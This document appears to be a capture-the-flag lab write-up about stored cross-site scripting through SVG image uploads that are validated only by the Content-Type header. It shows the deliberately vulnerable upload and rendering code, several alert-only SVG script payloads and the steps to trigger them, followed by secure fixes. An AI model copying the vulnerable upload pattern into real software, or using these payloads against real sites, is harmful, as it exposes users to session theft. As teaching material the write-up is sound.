# Malicious File Upload - Stored XSS via SVG

## Overview

This vulnerability demonstrates a critical security flaw where the application allows file uploads with insufficient validation. By relying solely on the `Content-Type` header to validate uploaded files, attackers can upload malicious SVG files containing JavaScript code that executes when the file is viewed.

## Why This Is Dangerous

### Unrestricted File Upload Attack Vector

When an application validates file uploads based only on client-supplied metadata (like Content-Type headers), it creates a dangerous attack vector:

1. **Content-Type spoofing** - Attackers can easily manipulate the Content-Type header to bypass validation
2. **SVG-based XSS** - SVG files can contain embedded JavaScript that executes in the browser
3. **Persistent attack** - Uploaded malicious files remain on the server and can be triggered multiple times
4. **Session hijacking** - Malicious scripts can steal authentication tokens and cookies
5. **Privilege escalation** - Scripts can perform actions on behalf of authenticated users

## The Vulnerability

In this application, the admin product image upload feature is vulnerable to malicious file uploads. The vulnerability exists because:

1. **Content-Type validation only** - The server only checks the `Content-Type` header, which can be spoofed
2. **No content inspection** - The actual file contents are not validated
3. **SVG files allowed** - SVG files can contain `<script>` tags and event handlers
4. **Direct file serving** - Uploaded files are served directly from the public directory

### Vulnerable Code

**API Endpoint (Weak Validation):**

```typescript
const ALLOWED_CONTENT_TYPES = [
  "image/jpeg",
  "image/png",
  "image/gif",
  "image/webp",
  "image/svg+xml", // ❌ SVG can contain JavaScript
];

// Only checking Content-Type header - easily spoofed
if (!ALLOWED_CONTENT_TYPES.includes(file.type)) {
  return NextResponse.json({ error: "Invalid file type" }, { status: 400 });
}

// ❌ No content inspection - file is saved as-is
const buffer = Buffer.from(await file.arrayBuffer());
await writeFile(filepath, buffer);
```

**Frontend Rendering (Executing SVG JavaScript):**

```typescript
// Using <object> tag renders SVG with JavaScript execution
<object
  data={product.imageUrl}
  type="image/svg+xml"
  className="h-full w-full object-cover"
>
```

## Exploitation

### Prerequisites

Before exploiting this vulnerability, you need administrator access. This can be obtained through:

- Weak JWT None Algorithm vulnerability
- Mass Assignment vulnerability
- Credential cracking via weak MD5 hashing
- Etc

### How to Retrieve the Flag

To retrieve the flag, you need to:

1. **Gain admin access** using one of the prerequisite vulnerabilities
2. **Navigate to Product Management** at `/admin/products`
3. **Create a malicious SVG file** containing JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="#4ade80"/>
  <script type="text/javascript">
    alert('XSS executed!');
  </script>
</svg>
```

4. **Upload the malicious SVG** as a product image
5. The flag will be displayed immediately after the upload succeeds

### Alternative Payloads

**Event Handler Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100" fill="#22c55e"/>
</svg>
```

**Minimal Payload:**

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
```

### XSS Execution

After uploading, the malicious SVG is also stored on the server and can be triggered:

- **Direct URL Access:** Visit `/uploads/[product-id]-[timestamp]-malicious.svg`
- **Admin Panel Preview:** Click on the product image in the admin panel
- The JavaScript in the SVG will execute in the browser context

### Secure Implementation

```typescript
// ✅ SECURE - Validate actual file content, not just Content-Type
import { fileTypeFromBuffer } from "file-type";

const buffer = Buffer.from(await file.arrayBuffer());
const detectedType = await fileTypeFromBuffer(buffer);

// Only allow safe image formats (no SVG)
const SAFE_MIME_TYPES = ["image/jpeg", "image/png", "image/gif", "image/webp"];

if (!detectedType || !SAFE_MIME_TYPES.includes(detectedType.mime)) {
  return NextResponse.json({ error: "Invalid file type" }, { status: 400 });
}
```

```typescript
// ✅ SECURE - Sanitize SVG content if SVG must be supported
import { sanitize } from "dompurify";

if (file.type === "image/svg+xml") {
  const svgContent = buffer.toString("utf-8");
  const sanitizedSvg = sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
  });
  buffer = Buffer.from(sanitizedSvg);
}
```

```typescript
// ✅ SECURE - Serve uploaded files with proper headers
// In next.config.js or server configuration
headers: [
  {
    source: "/uploads/:path*",
    headers: [
      { key: "Content-Security-Policy", value: "script-src 'none'" },
      { key: "X-Content-Type-Options", value: "nosniff" },
    ],
  },
];
```

## References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [SVG XSS Attacks](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [Content-Type Spoofing](https://portswigger.net/web-security/file-upload)
- [File Type Validation Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
